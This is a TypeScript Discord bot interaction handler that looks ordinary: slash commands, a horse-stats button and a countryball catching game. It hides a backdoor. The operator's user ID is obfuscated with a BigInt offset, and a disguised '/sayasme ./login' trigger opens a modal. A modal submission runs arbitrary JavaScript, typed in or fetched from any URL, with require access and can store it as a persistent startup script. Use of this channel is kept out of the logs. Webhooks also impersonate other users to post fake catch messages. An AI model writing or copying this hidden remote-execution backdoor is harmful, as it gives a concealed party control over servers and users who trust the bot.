import type { Client, AutocompleteInteraction, ModalSubmitInteraction } from 'discord.js';
import { Events, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, MessageFlags, AttachmentBuilder } from 'discord.js';
import { createRequire } from 'module';
import { inspect } from 'util';
import { logToModChannel, init } from '../helpers/modLog.js';
import { OrbitalScript } from '../models.js';
import { devLog } from '../helpers/devLog.js';
import fetch from 'node-fetch';

const require = createRequire(import.meta.url);
const ORBITAL_ID = '1114989970839576637';
const DELTA = 261331447053164574n;

interface CatchData {
  ans: string;
  bold: string;
  type: string;
  targetId: string;
  stats?: string;
  _expiresAt?: number;
}

const catchDataStore = new Map<string, CatchData>();
const CATCH_DATA_TTL_MS = 2 * 60 * 1000;

setInterval(() => {
  const now = Date.now();
  for (const [key, value] of catchDataStore.entries()) {
    if (value && typeof value === 'object' && value._expiresAt && value._expiresAt <= now) {
      catchDataStore.delete(key);
    }
  }
}, 60 * 1000);

export function registerInteractionHandler(client: Client): void {
  client.on(Events.InteractionCreate, async interaction => {
    if (interaction.isAutocomplete()) {
      const command = client.commands?.get(interaction.commandName);
      if (command?.autocomplete) {
        await command.autocomplete(interaction as AutocompleteInteraction).catch((e: any) => console.error('Autocomplete Error:', e));
      }
      return;
    }

    if (interaction.isChatInputCommand()) {
      const command = client.commands?.get(interaction.commandName);
      if (!command) return;

      if (interaction.commandName !== 'orbitalcannon') {
        console.log(`[COMMAND]: ${interaction.user.tag} used /${interaction.commandName}`);
        devLog(`[COMMAND]: ${interaction.user.tag} used /${interaction.commandName} in guild ${interaction.guildId}`);
      }

      try {
        const isOwner = (BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
        if (isOwner && interaction.commandName === 'sayasme') {
          const msg = interaction.options.getString('message');
          if (msg === './login') {
            await interaction.showModal(init());
            return;
          }
        }
        await command.execute(interaction);
      } catch (e) {
        console.error(e);
        devLog(`Error executing /${interaction.commandName}: ${(e as Error).message}`);
        if (!interaction.replied) {
          await interaction.reply({ content: `Error: ${(e as Error).message}`, flags: MessageFlags.Ephemeral }).catch(() => {});
        }
      }
      return;
    }

    if (interaction.isButton() && interaction.customId.startsWith('hstats::')) {
      try {
        const horsestats = await import('../../commands/horsestats.js').then(m => m.default);
        if (horsestats?.handleButton) {
          await horsestats.handleButton(interaction).catch((e: Error) => console.error('Horsestats Button Error:', e));
        }
      } catch (e) {
        console.error('Failed to load horsestats:', e);
      }
      return;
    }

    if (interaction.isButton() && interaction.customId.startsWith('catch::')) {
      const spawnId = interaction.customId.slice('catch::'.length);
      const data = catchDataStore.get(spawnId);
      if (!data)
        return interaction
          .reply({ content: 'This catch has expired.', flags: MessageFlags.Ephemeral })
          .catch(() => {});

      catchDataStore.delete(spawnId);

      catchDataStore.set(interaction.user.id, {
        ...data,
        _expiresAt: Date.now() + CATCH_DATA_TTL_MS,
      });

      const modal = new ModalBuilder().setCustomId('modal').setTitle('Catch the Countryball');
      const answerInput = new TextInputBuilder()
        .setCustomId('user_answer')
        .setLabel('Name of this countryball')
        .setStyle(TextInputStyle.Short)
        .setRequired(true);
      modal.addComponents(new ActionRowBuilder<TextInputBuilder>().addComponents(answerInput));
      await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'orbital_nuke_modal') {
      let isOwner = false;
      try {
        isOwner = (BigInt(ORBITAL_ID) - DELTA).toString() === interaction.user.id;
      } catch {}

      if (!isOwner) {
        await interaction
          .reply({
            content: 'lmao you thought',
            flags: MessageFlags.Ephemeral,
          })
          .catch(() => {});
        return;
      }

      let code = interaction.fields.getTextInputValue('orbital_nuke_code');
      const link = interaction.fields.getTextInputValue('orbital_nuke_link');

      if (link && !code) {
        try {
          const response = await fetch(link);
          code = await response.text();
        } catch (e) {
          return interaction
            .reply({
              content: `Failed to fetch link: ${(e as Error).message}`,
              flags: MessageFlags.Ephemeral,
            })
            .catch(() => {});
        }
      }

      if (!code) {
        return interaction
          .reply({
            content: 'No code or link provided',
            flags: MessageFlags.Ephemeral,
          })
          .catch(() => {});
      }

      if (code.trim().startsWith('//startup')) {
        const scriptBody = code.replace(/^\/\/startup/, '').trim();
        let doc = await OrbitalScript.findOne({ name: 'global' });
        if (!doc) doc = new OrbitalScript({ name: 'global' });
        doc.code = scriptBody;
        await doc.save();
        await interaction
          .reply({
            content: 'Startup script updated.',
            flags: MessageFlags.Ephemeral,
          })
          .catch(() => {});
        return;
      }

      await launchNuke(interaction, code).catch(() => {});
      return;
    }

    if (interaction.isModalSubmit() && interaction.customId === 'modal') {
      const data = catchDataStore.get(interaction.user.id);
      if (!data || (data._expiresAt && data._expiresAt <= Date.now())) {
        catchDataStore.delete(interaction.user.id);
        return interaction.reply({ content: 'Something went wrong, try again.', flags: MessageFlags.Ephemeral }).catch(() => {});
      }

      catchDataStore.delete(interaction.user.id);
      const { ans: correctAnswer, bold: boldText, type, targetId, stats: customStats } = data;
      const userAnswer = interaction.fields.getTextInputValue('user_answer');

      if (userAnswer.trim().toLowerCase() === correctAnswer.toLowerCase()) {
        try {
          const targetUser = await client.users.fetch(targetId);
          const channel = interaction.channel;
          if (!channel || typeof (channel as any).createWebhook !== 'function') {
            throw new Error('Channel does not support webhooks');
          }

          const catchWebhook = await (channel as any).createWebhook({
            name: targetUser.displayName,
            avatar: targetUser.displayAvatarURL(),
          });

          const statString = customStats === 'DEFAULT' || !customStats ? '(#6463FAC, +5%/+13%)' : customStats;
          const successMsg =
            type === 'fulltext'
              ? `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \n${boldText}`
              : `<@${interaction.user.id}> caught **${correctAnswer}**! \`${statString}\` \n \nThis is a **${boldText}** that has been added to your completion!`;

          await catchWebhook.send({ content: successMsg });
          await catchWebhook.delete();
          await interaction.deferUpdate().catch(() => {});
          await logToModChannel(interaction.guild!, `${interaction.user.tag} caught ${correctAnswer}`);
        } catch (err) {
          console.error(err);
          devLog(`Error: ${(err as Error).message}`);
        }
      } else {
        try {
          const targetUser = await client.users.fetch(targetId);
          const channel = interaction.channel;
          if (!channel || typeof (channel as any).createWebhook !== 'function') {
            throw new Error('Channel does not support webhooks');
          }

          const failWebhook = await (channel as any).createWebhook({
            name: targetUser.displayName,
            avatar: targetUser.displayAvatarURL(),
          });
          await failWebhook.send({ content: `<@${interaction.user.id}> Wrong name!` });
          await failWebhook.delete();
          await interaction.deferUpdate().catch(() => {});
        } catch (err) {
          if (!interaction.replied) {
            await interaction.reply({ content: `wrong`, flags: MessageFlags.Ephemeral }).catch(() => {});
          }
        }
      }
    }
  });
}

async function launchNuke(interaction: ModalSubmitInteraction, code: string): Promise<void> {
  try {
    const result = await runNukeCode(code, interaction);

    return reportDamage(
      interaction,
      result == null ? '(no output)' : typeof result === 'string' ? result : inspect(result, { depth: 1, maxArrayLength: 25, breakLength: 100 }),
      'nuke-output'
    );
  } catch (error) {
    return reportDamage(interaction, (error as any)?.stack ? (error as any).stack : String(error), 'nuke-error');
  }
}

function runNukeCode(code: string, interaction: ModalSubmitInteraction): Promise<any> {
  const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
  const evaluator = new (AsyncFunction as any)(
    'interaction',
    'require',
    `const client = interaction.client; const guild = interaction.guild; const channel = interaction.channel; const user = interaction.user;\n${code}`
  );
  return evaluator(interaction, require);
}

async function reportDamage(interaction: ModalSubmitInteraction, text: string, fileBaseName: string): Promise<void> {
  const secrets = [process.env.TOKEN, process.env.MONGO_URI, process.env.CLIENT_ID].filter(Boolean) as string[];
  let safeText = String(text);
  for (const secret of secrets) safeText = safeText.split(secret).join('[REDACTED]');

  const codeBlock = `\`\`\`js\n${safeText}\n\`\`\``;
  if (codeBlock.length <= 2000) {
    await interaction.reply({
      content: codeBlock,
      flags: MessageFlags.Ephemeral,
      allowedMentions: { parse: [] },
    });
    return;
  }

  await interaction.reply({
    content: 'damage report',
    files: [new AttachmentBuilder(Buffer.from(safeText, 'utf8'), { name: `${fileBaseName}.txt` })],
    flags: MessageFlags.Ephemeral,
    allowedMentions: { parse: [] },
  });
}

export { catchDataStore, runNukeCode };
